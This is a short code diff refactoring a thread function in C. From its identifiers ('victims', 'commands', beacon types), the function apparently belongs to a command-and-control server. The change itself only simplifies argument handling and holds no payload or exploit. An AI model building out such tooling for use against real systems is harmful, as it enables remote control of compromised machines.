@@ -351,12 +351,9 @@ typedef struct{
 void *net_pthread_server(void *args){
   pthread_t id = pthread_self();
   pthread_cleanup_push(net_pthread_cleanup, &id);
-  net_pthread_server_args_t  *p_net_server_async_args = args;
-  net_client_beacon_t **p_victims = p_net_server_async_args->p_victims;
-  net_server_beacon_t **p_commands = p_net_server_async_args->p_commands;
-  int port = p_net_server_async_args->port;
-  net_server(port, p_victims, p_commands);
-  free(p_net_server_async_args);
+  net_pthread_server_args_t  *p_args = args;
+  net_server(p_args->port, p_args->p_victims, p_args->p_commands);
+  free(p_args);
   pthread_cleanup_pop(0);
   pthread_exit(NULL);
 }
